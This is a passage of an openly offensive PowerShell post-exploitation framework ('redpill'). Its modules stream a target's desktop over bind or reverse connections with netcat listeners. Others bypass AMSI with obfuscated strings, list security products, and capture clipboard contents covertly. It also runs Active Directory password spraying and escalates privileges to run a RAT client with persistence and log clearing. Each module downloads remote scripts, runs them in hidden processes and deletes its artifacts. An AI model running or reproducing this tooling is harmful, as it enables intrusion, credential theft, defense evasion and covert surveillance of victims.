      Start firefox on attacker side on: http://192.168.1.73:9000 to access stream!
      -----------------------------------------------------------------------------
      Streaming remote target desktop for: 30 seconds!
      Stoping process Id: 12334 (LiveStream)
      Deleting ALL artifacts left behind!

   .LINK
      https://www.labofapenetrationtester.com/2015/12/stream-targets-desktop-using-mjpeg-and-powershell.html
   #>


   If($LiveStream -ieq "Bind")
   {

      ## Make sure requirements are sastified!
      If($Port -ieq "false")
      {
         $Port = "1234" ## Default bind cmdlet port!
         Write-Host "[error] None -port sellected, defaulting to '1234' tcp" -ForegroundColor DarkYellow  
      }

      ## Download Stream-TargetDesktop.ps1 from my GitHub
      If(-not(Test-Path -Path "$Env:TMP\Stream-TargetDesktopps1")){## Download Stream-TargetDesktop.ps1 from my GitHub repository
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -Destination $Env:TMP\Stream-TargetDesktop.ps1 -ErrorAction SilentlyContinue|Out-Null
         ## Check downloaded file integrity => FileSizeKBytes
         $SizeDump = ((Get-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,693359375/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1"){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
         }   
      }

      ## Build OutPut Table
      Write-Host "`n`nStream desktop settings" -ForegroundColor Green
      Write-Host "-----------------------"
      Write-Host "Target   : $Address"
      Write-Host "Stream   : Bind"
      Write-Host "BindPort : $Port"
      If($Timmer -eq 0)
      {
         Write-Host "Timmer   : Manual stop sellected!`n`n"
      }
      Else
      {
         Write-Host "Timmer   : $Timmer (sec)`n`n"
      }


      Start-Sleep -Seconds 1
      ## Create trigger script to import\run module on a diferent process! (child)
      Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
      echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Bind -Port $Port"

      ## Run remote module in a new powershell process
      Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
      Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"|Out-Null


      ## Start firefox to access streaming!
      Write-Host "-----------------------------------------------------------------------------"
      Write-Host "Start firefox on attacker side on: http://${Address}:${Port} to access stream!" -ForegroundColor Green
      Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
      If($Timmer -eq 0)
      {
         Write-Host "Streaming remote target desktop for: Manual stop sellected!"
      }
      Else
      {
         Write-Host "Streaming remote target desktop for: $Timmer seconds!"      
      }


      If($Timmer -ne 0)
      {
         Start-Sleep -Seconds $Timmer ## Timmer to stop the streaming!
         $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
         Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
         Stop-Process -id $StreamPid -EA SilentlyContinue -Force

         ## Delete artifacts left behind
         Write-Host "Deleting ALL artifacts left behind!"
         If(Test-Path -Path "$Env:TMP\mypid.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\mypid.log" -Force}
         If(Test-Path -Path "$Env:TMP\trigger.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\trigger.ps1" -Force}
         If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
         Write-Host "`n";Start-Sleep -Seconds 1
      }
      Else
      {
         Write-Host "To stop stream execute: powershell -File redpill.ps1 -LiveStream Stop" -ForegroundColor DarkYellow
         echo "Port: $Port"|Out-File -FilePath "$Env:TMP\myport.log" -Encoding ascii -Force
         Write-Host "";Start-Sleep -Seconds 1
      }

   } ## End of Bind arg


   If($LiveStream -ieq "Reverse")
   {

      ## Make sure requirements are sastified!
      If($IpAddress -ieq "False")
      {
         Write-Host "[error] This function requires attacker -IpAddress '<string>'!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "";Start-Sleep -Seconds 1
         exit ## Exit @redpill
      }
      If($Port -ieq "False")
      {
         Write-Host "[error] This function requires reverse tcp shell -port '<string>'!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "";Start-Sleep -Seconds 1
         exit ## Exit @redpill
      }

      ## Download Stream-TargetDesktop.ps1 from my GitHub
      If(-not(Test-Path -Path "$Env:TMP\Stream-TargetDesktopps1")){## Download Stream-TargetDesktop.ps1 from my GitHub repository
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -Destination $Env:TMP\Stream-TargetDesktop.ps1 -ErrorAction SilentlyContinue|Out-Null
         ## Check downloaded file integrity => FileSizeKBytes
         $SizeDump = ((Get-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,693359375/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1"){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
         }   
      }

      ## Build OutPut Table
      Write-Host "`nStream desktop settings" -ForegroundColor Green
      Write-Host "--------------------------"
      Write-Host "Target      : $Address"
      Write-Host "Attacker    : $IpAddress"
      Write-Host "Stream      : Reverse"
      Write-Host "ReversePort : $Port"
      If($Timmer -eq 0)
      {
         Write-Host "Timmer      : Manual stop sellected!`n`n"
      }
      Else
      {
         Write-Host "Timmer      : $Timmer (sec)`n`n"
      }


      Start-Sleep -Seconds 1
      ## Create trigger script to import\run module on a diferent process! (child)
      Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
      echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $IpAddress -Port $Port"

      ## Run remote module in a new powershell process
      Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
      Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"|Out-Null


      ## Start firefox to access streaming!
      Write-Host "-----------------------------------------------------------------------------"
      Write-Host "Execute on attacker console : nc -nlvp ${Port} | nc -nlvp 9000" -ForegroundColor Green
      Write-Host "Start firefox on attacker pc: http://${IpAddress}:9000 to access stream!" -ForegroundColor Green
      Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
      If($Timmer -eq 0)
      {
         Write-Host "Streaming remote target desktop for: Manual stop sellected!"
      }
      Else
      {
         Write-Host "Streaming remote target desktop for: $Timmer seconds!"      
      }


      If($Timmer -ne 0)
      {
         Start-Sleep -Seconds $Timmer ## Timmer to stop streamming!
         $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
         Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
         Stop-Process -id $StreamPid -EA SilentlyContinue -Force

         ## Delete artifacts left behind
         Write-Host "Deleting ALL artifacts left behind!"
         If(Test-Path -Path "$Env:TMP\mypid.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\mypid.log" -Force}
         If(Test-Path -Path "$Env:TMP\trigger.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\trigger.ps1" -Force}
         If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
         Write-Host "`n";Start-Sleep -Seconds 1
      }
      Else
      {
         Write-Host "To stop stream execute: powershell -File redpill.ps1 -LiveStream Stop" -ForegroundColor DarkYellow
         echo "Port: $Port"|Out-File -FilePath "$Env:TMP\myport.log" -Encoding ascii -Force
         Write-Host "";Start-Sleep -Seconds 1
      }

   } ## End of Reverse arg


   If($LiveStream -ieq "Stop")
   {
   
      <#
      .SYNOPSIS
         Helper - Stops stream on remote host and deletes artifacts!

      .NOTES
         The parameter -LiveStream 'Bind|Reverse' creates 'mypid.log'
         on target %tmp% directory to store the port used and the child
         process PID (stream) required to Stop remote streamming later!
      #>


      If(-not(Test-Path -Path "$Env:TMP\mypid.log" -EA SilentlyContinue))
      {
         Write-Host "[error] file not found: '$Env:TMP\mypid.log'.." -ForegroundColor Red -BackgroundColor Black
         Write-Host "mypid.log contains the last stream process PID required by this module!" -ForegroundColor DarkYellow
         Write-Host "";Start-Sleep -Seconds 1
         exit ## Exit @redpill
      }

      $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
      $RawPort = Get-Content -Path "$Env:TMP\myport.log" -EA SilentlyContinue | Where-Object { $_ -iMatch '^(Port:)' }
      $FinalPort = $RawPort -replace 'Port: ',''

      ## Build OutPut Table
      Write-Host "`nStream desktop settings" -ForegroundColor Green
      Write-Host "-----------------------"
      Write-Host "Target   : $Address"
      Write-Host "Stream   : Stop"
      Write-Host "BindPort : $FinalPort"
      Write-Host "StreamId : $StreamPid (remote)`n`n"
      Start-Sleep -Seconds 2

      Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
      Stop-Process -id $StreamPid -EA SilentlyContinue -Force

      ## Delete ALL artifacts left behind!
      Write-Host "Deleting ALL artifacts left behind!"
      If(Test-Path -Path "$Env:TMP\mypid.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\mypid.log" -Force}
      If(Test-Path -Path "$Env:TMP\myport.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\myport.log" -Force}
      If(Test-Path -Path "$Env:TMP\trigger.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\trigger.ps1" -Force}
      If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
      Write-Host "";Start-Sleep -Seconds 1
   
   } ## End of Stop arg

}


If($GetCounterMeasures -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List common security processes running!

   .DESCRIPTION
      This cmdlet enumerates common security product processes running
      on target system, By exec 'Get-Process' powershell cmdlet {native}
      to retrieve process 'product name', 'process name' and 'process pid'

   .NOTES
      This cmdlet is an aux module of @redpill -sysinfo 'verbose'
      Currentlly this cmdlet query for the most common AV processes,
      AppWhitelisting, Behavioral Analysis, Intrusion Detection, DLP.

   .Parameter Action
      Accepts arguments: Enum, Verbose (default: Enum)

   .EXAMPLE
      PS C:\> Get-Help .\GetCounterMeasures.ps1 -full
      Access this cmdlet comment based help

   .EXAMPLE
      PS C:\> powershell -file GetCounterMeasures.ps1
      List common security product processes running!

   .EXAMPLE
      PS C:\> powershell -file GetCounterMeasures.ps1 -Action Verbose
      List common security product processes names, AppWhitelisting,
      Behavioral Analysis, EDR, DLP, Intrusion Detection, Firewall, HIPS.

   .OUTPUTS
      Common security processes running!
      ----------------------------------
      Product      : Windows Defender AV
      Description  : Anti-Virus
      ProcessName  : MsMpEng
      Pid          : 3516

      Product      : CrowdStrike Falcon EDR
      Description  : Behavioral Analysis
      ProcessName  : CSFalcon
      Pid          : 8945
   #>

   ## Download GetCounterMeasures.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1")){## Download GetCounterMeasures.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1 -Destination $Env:TMP\GetCounterMeasures.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 25){## Corrupted download detected => DefaultFileSize: 25,1572265625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1"){Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetCounterMeasures -ieq "false"){$GetCounterMeasures = "Verbose"}
   powershell -File "$Env:TMP\GetCounterMeasures.ps1" -Action "$GetCounterMeasures"

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1"){Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force}
}




If($NoAmsi -ne "false"){

<#
.SYNOPSIS
   Test AMS1 string bypasses or simple execute one bypass technic!
   
.DESCRIPTION
   This cmdlet tests an internal list of amsi_bypass_technics on
   current shell or simple executes one of the bypass technics.
   This cmdlet re-uses: @_RastaMouse, @Mattifestation and @nullbyte
   source code POC's obfuscated {by me} to evade string\runtime detection.
   
.NOTES
   _Remark: The Am`si_bypasses will only work on current shell while is
   process is running. But on process close all will return to default.
   _Remark: If sellected -Action '<testall>' then this cmdlet will try
   all available bypasses and aborts at the first successfull bypass.

.Parameter NoAmsi
   Accepts arguments: list, testall, bypass, Scriptlogging (default: bypass)

.Parameter Id
  The technic Id to use for am`si_bypass (default: 2)  

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action Scriptlogging
   Just disable PS ScriptBlockLogging in current shell!

.EXAMPLE
   PS C:\> .\redpill.ps1 -NoAmsi List
   List ALL cmdlet Am`si_bypasses available!

.EXAMPLE
   PS C:\> .\redpill.ps1 -NoAmsi TestAll
   Test ALL cmdlet Am`si_bypasses technics!

.EXAMPLE
   PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 2
   Execute Am`si_bypass technic nº2 on current shell!

.OUTPUTS
   Testing am`si_bypass technics
   ----------------------------
   Id          : 1
   bypass      : Success
   Disclosure  : @nullbyte
   Description : PS_DOWNG`RADE_ATT`ACK
   POC         : Execute: powershell -version 2 -C Get-Host
   Remark      : Execute 'exit' to return to PSv5 console!

   Id          : 2
   bypass      : success
   Disclosure  : @mattifestation
   Description : DL`L_REFLE`CTION
   POC         : ----
   Remark      : string detection bypassed!

   Id          : 3
   bypass      : success
   Disclosure  : @mattifestation
   Description : FORCE_AM`SI_ERROR
   POC         : ----
   Remark      : string detection bypassed! 
   
   Id          : 4
   bypass      : success
   Disclosure  : @_RastaMouse
   Description : AM`SI_RESULT_CLEAN
   POC         : ----
   Remark      : string detection bypassed!

   Id          : 5
   bypass      : success
   Disclosure  : @am0nsec
   Description : AM`SI_SCANBUFF`ER_PATCH
   POC         : ----
   Remark      : string detection bypassed! 
#>

   ## Download NoAmsi.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\NoAmsi.ps1")){## Download NoAmsi.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NoAmsi.ps1 -Destination $Env:TMP\NoAmsi.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\NoAmsi.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 40){## Corrupted download detected => DefaultFileSize: 40,318359375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## replace global variable on NoAmsi.ps1
   ((Get-Content -Path "$Env:TMP\NoAmsi.ps1" -Raw) -Replace "viriato='0'","viriato='1'")|Set-Content -Path "$Env:TMP\NoAmsi.ps1" -Force
   ## Append @arguments to downloaded cmdlet
   If($PSargs -ne "false"){((Get-Content -Path "$Env:TMP\NoAmsi.ps1" -Raw) -Replace "#<INPUT_CMDLET_ARGUMENT_LIST>","$PSargs")|Set-Content -Path "$Env:TMP\NoAmsi.ps1" -Force}

   ## Run auxiliary module
   If($NoAmsi -ieq "List")
   {
      powershell -File "$Env:TMP\NoAmsi.ps1" -Action List
   }
   ElseIf($NoAmsi -ieq "TestAll")
   {
      ## &"<script>" allows me to run NoAmsi on redpill process
      &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi
   }
   ElseIf($NoAmsi -ieq "Bypass")
   {
      If($PayloadURL -ne "false")
      {
         If($Id -eq "false"){$Id = "2"}
         ## &"<script>" allows me to run NoAmsi on redpill process
         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -PayloadURL "$PayloadURL" -Id $Id
      }
      Else
      {
         If($Id -eq "false"){$Id = "2"}
         ## &"<script>" allows me to run NoAmsi on redpill process
         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
      }
   }
   Else
   {
      Write-Host "[error] Bad parameter input ($NoAmsi)" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @redpill
   }

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
}



If($Clipboard -ne "false"){

   <#
   .SYNOPSIS
      Capture clipboard text\file\image\audio contents!

   .DESCRIPTION
      This module captures clipboard content everytime the clipboard its used!
      The clipboard is a section of RAM where your computer stores copied data.
      This can be a selection of text, an image, a file, or other type of data
      it is placed in the clipboard whenever you use the "Copy" (CTRL+C) command.  

   .NOTES
      If sellected the parameter -Action '<Capture>' then this cmdlet start
      capture clipboard for a specified amount of time defined by -CaptureTime
      If sellected -Forensic '<True>' then this cmdlet will store files, images,
      audio files beeing passed to clipboard into '$Env:TMP\Forensic' directory!
   
   .Parameter Action
      Accepts arguments: Enum, Capture, Prank (default: Enum)

   .Parameter Database
      [Capture] The path where to store captures (default: $Env:TMP\clipboard.log)

   .Parameter CaptureTime
      [Capture] The amount of time in seconds to capture clipboard (default: 30)

   .Parameter GetStrings
      [Capture] The interval in seconds for query clipboard contents (default: 2)
   
   .Parameter Forensic
      [Capture] Store the documents beeing passed to the clipboard? (default: false)
   
   .Parameter SetText
      [Prank] The text data to overwrite the clipboard with (default: Eureka)

   .Parameter SetPath
      [Prank] The path to overwrite the clipboard with (default: $Env:WINDIR\System32\calc.exe)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Enum
      Capture current clipboard text\file\image\audio!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Capture -CaptureTime "10" -Database "$Env:TMP\clip.log"
      Capture clipboard contents for 10 seconds total time into -Database '<string>' directory!
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Capture -CaptureTime "30" -Forensic True
      Capture clipboard contents for 30 sec and Store files beeing passed to clipboard!
      Remark: This function creates 'Forensic' folder under %TMP% directory for storage!
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Prank -CaptureTime "15" -SetText "HACKED" -SetPath "$Env:TMP"
      Overwrite clipboard data for 15 seconds by -SetText '<string>' and -SetPath '<string>' values!
      Remark: This function set's the clipboard to our data every 2 sec until -CaptureTime its reached!

   .OUTPUTS
      * Capture SKYNET clipboard for 30 seconds time!
        => logfile 'C:\Users\pedro\AppData\Local\Temp\clip.log'

      [07:54:26] whoami
      [07:54:28] myS3cr3tpAss
      [07:54:30] netstat -ano|findstr "ESTABLISHED"
      [07:54:32] C:\Users\pedro\music\ironmaiden\eddie.mp4
      [07:54:34] C:\Users\pedro\images\praiadasamoqueira.jpg
      [07:54:36] C:\Users\pedro\Coding\redpill\bin\NoAmsi.ps1
   #>

   ## Download clipboard.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\clipboard.ps1"))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1" -OutFile "$Env:TMP\clipboard.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      #Expand-Archive "$Env:TMP\clipboard.zip" -DestinationPath "$Env:TMP"
      If(-not(Test-Path -Path "$Env:TMP\clipboard.ps1" -EA SilentlyContinue))
      {
         Write-Host "ERROR: fail to download $Env:TMP\clipboard.ps1!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n";exit #Exit @redpill
      }
   }


   ## Run auxiliary module
   If($clipboard -ieq "Enum")
   {
      Powershell -File "$Env:TMP\Clipboard.ps1" -Action Enum
   }
   ElseIf($clipboard -ieq "Capture" -and $CaptureTime -gt 60)
   {
      #Remark: Run cmdlet in a child process (background) If -CaptureTime its bigger than 60 seconds!
      Start-Process -WindowStyle hidden powershell -ArgumentList "powershell -File $Env:TMP\Clipboard.ps1 -Action Capture -CaptureTime $CaptureTime -Database $Database -Forensic $Forensic"

      #Banner displays
      Write-Host "`n* [STEALTH] Capture $Env:COMPUTERNAME clipboard for $CaptureTime seconds time!" -ForegroundColor Green
      Write-Host "  => logfile '$Database'" -ForegroundColor DarkCyan
      If($Forensic -ieq "True")
      {
         Write-Host "     => Forensic '$Env:TMP\Forensic'" -ForegroundColor DarkCyan
      }
      Write-Host "`n`n"
   }
   ElseIf($clipboard -ieq "Capture" -and $CaptureTime -le 60)
   {
      Powershell -File "$Env:TMP\Clipboard.ps1" -Action Capture -CaptureTime "$CaptureTime" -Database "$Database" -Forensic $Forensic
   }
   ElseIf($clipboard -ieq "Prank")
   {
      Powershell -File "$Env:TMP\Clipboard.ps1" -Action Prank -CaptureTime "$CaptureTime" -SetText "$SetText" -SetPath "$SetPath"
   }


   ## Clean Artifacts left behind
   If($CaptureTime -le 60)
   {
      If(Test-Path -Path "$Env:TMP\clipboard.ps1")
      {
         Remove-Item -Path "$Env:TMP\clipboard.ps1" -Force
      }
   }
   Remove-Item -Path "$Env:TMP\clipboard.zip" -EA SilentlyContinue -Force
}



If($PasswordSpray -ne "false")
{
   <#
   .SYNOPSIS
      Author: @JakobHeidelberg & @CyberKeel
      Helper - Password spraying attack against accounts in Active Directory!

   .DESCRIPTION
       PoC PowerShell script to demo how to perform password spraying attacks against 
       user accounts in Active Directory (AD), aka low and slow online brute force method.
    
       Should NOT be considered OPSEC safe since:
       - a lot of traffic is generated between the host and the Domain Controller(s).
       - failed logon events will be massive on Domain Controller(s).
       - badpwdcount will iterate on user account objects in scope.

   .NOTES
       Does not require admin access, neither in AD or on Windows host.
       No accounts should be locked out by this script alone, but there are no guarantees.
       NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.

   .Parameter PasswordSpray
      Accepts arguments: Spray (default: Spray)

   .Parameter Password
      Input single or multiple passwords to test (default: false)

   .Parameter FilePath
      The path to the password input file to use (default: false)

   .Parameter Url
      Download file from given URL and use as password input file (default: false)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PasswordSpray Spray -Password "admin123,s3cr3t"
      Specify a single or multiple passwords to test for each targeted user account.
      Eg. -Pass 'Password1,Password2'. Do not use together with -FilePath or -Url.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PasswordSpray Spray -FilePath "$Env:TMP\dicionary.txt"
      Supply a path to a password input file to test multiple passwords for each
      targeted user account. Do not use together with -Password or -Url.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PasswordSpray Spray -Url "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/rockme.txt"
      Download the password file with weak passwords and test each password against all active user accounts (except privileged)

   .OUTPUTS
      [START]: Password spraying attack!
      VERBOSE: Lockout duration is: 30 attempts.
      VERBOSE: Threshold is probably 'Never', setting max to 1000 ..
      Guessed password for user: 'Pedro' = 'mys3cr3tpass'
   #>

   ## Download Spray-Passwords.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Spray-Passwords.ps1"))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1" -OutFile "$Env:TMP\Spray-Passwords.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\Spray-Passwords.ps1" -EA SilentlyContinue))
      {
         Write-Host "ERROR: fail to download $Env:TMP\Spray-Passwords.ps1!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n";exit #Exit @redpill
      }
   }


   ## Run auxiliary module
   If($Password -ne "false")
   {
      Powershell -File "$Env:TMP\Spray-Passwords.ps1" -Pass "$Password" -Verbose
   }
   ElseIf($FilePath -ne "false")
   {
      If(-not(Test-Path -Path "$FilePath") -or $FilePath -iNotMatch '(.txt)$')
      {
         Write-Host "ERROR:: bad -FilePath '$FilePath' input!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "SYNTAX: The -FilePath must exist localy and end with .txt" -ForegroundColor Yellow
         Write-Host "EXAMPLE: $Env:TMP\rockme.txt" -ForegroundColor Yellow
         Write-Host "`n`n";exit #Exit @redpill      
      }
      Powershell -File "$Env:TMP\Spray-Passwords.ps1" -File "$FilePath" -Verbose
   }
   ElseIf($Url -ne "false")
   {
      #Checking for correct URL inputs!
      If($Url -iNotMatch '[http(s)]:' -or $Url -iNotMatch '(.txt)$')
      {
         Write-Host "ERROR:: bad -Url '$Url' input!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "SYNTAX: The URL must start with http(s) and end with .txt" -ForegroundColor Yellow
         Write-Host "EXAMPLE: https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/rockme.txt" -ForegroundColor Yellow
         Write-Host "`n`n";exit #Exit @redpill
      }
      Powershell -File "$Env:TMP\Spray-Passwords.ps1" -Url "$Url" -Verbose
   }


   Write-Host "`n"
   ## Clean Artifacts left behind
   Remove-Item -Path "$Env:TMP\Spray-Passwords.ps1" -EA SilentlyContinue -Force

}


If($GetAdmin -ne "false"){

   <#
   .SYNOPSIS
      Elevate sessions from UserLand to Administrator!

   .DESCRIPTION
      Often in penetration tests our payload tends to be executed without administrator
      privileges by target user. This cmdlet allows attackers to elevate our payload(s)
      from 'UserLand' to 'Administrator' privileges by asking the attacker to input payload
      absolucte path and creating an PS1 script in %tmp% that silently executes EOP technic.

   .NOTES
      Workflow: The attacker needs to run the GetAdmin cmdlet to create the PS1 script that
      silently executes our payload at predefined time intervals (DelayTime), then needs to
      exit the current shell and start a new handler to wait for the new elevated connection.

      Remark: Avoid set directorys with empty spaces in -FilePath '<string>' argument declarations.
      Remark: The -filepath '<Payload>' parameter only executes payloads: '<ps1, bat, vbs, py, exe>'.
      Remark: The -delaytime '<int>' parameter sets the timer for the loop between payload executions.
      Remark: The -action '<check>' param clears Powershell\Defender logs if it manages to escalate privs. 

   .Parameter GetAdmin
      Accepts arguments: check, exec (default: check)

   .Parameter FilePath
      The payload to execute absolucte path (default: false)

   .Parameter Try
      The amount of payload executions to try (default: 1)

   .Parameter DelayTime
      The time in seconds to delay payload exec (default: 30)

   .Parameter Persiste
      Persiste payload EOP execution on startup? (default: false)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetAdmin Check
      Can we escalate privileges? (testing)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetAdmin Exec -Try "3" -DelayTime "13" -FilePath "$Env:TMP\revTCPclient.ps1"
      Execute rat client (revTCPclient.ps1) 3 times max, with 13 seconds of delay between each execution.
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetAdmin Exec -Try "120" -DelayTime "60" -FilePath "$Env:TMP\revTCPclient.ps1" -Persiste True
      [startup] Execute rat client (revTCPclient.ps1) 120 times max, with 60 seconds of delay between each EOP execution.

   .OUTPUTS
      * Elevate session from UserLand to Admin! (EOP)

      Try  DelayTime  Persiste  FilePath
      ---  ---------  --------  --------
      2    30(sec)    False     C:\Users\pedro\AppData\Local\Temp\revTCPclient.ps1

      * Exit your rat shell, start a new handler to recive the elevated connection.
        => Remenber: To manual delete artifacts from 'TMP' folder after escalation.
   #>

   ## Download GetAdmin.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetAdmin.ps1"))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetAdmin.ps1" -OutFile "$Env:TMP\GetAdmin.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\GetAdmin.ps1" -EA SilentlyContinue))
      {
         Write-Host "ERROR: fail to download $Env:TMP\GetAdmin.ps1!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n";exit #Exit @redpill
      }
   }


   ## Run auxiliary module
   If($GetAdmin -ieq "check")
   {
      Powershell -File "$Env:TMP\GetAdmin.ps1" -Action check
   }
   ElseIf($GetAdmin -ieq "Exec")
   {
      Powershell -File "$Env:TMP\GetAdmin.ps1" -Action Exec -Try "$Try" -DelayTime "$DelayTime" -FilePath "$FilePath" -Persiste $Persiste
   }

}



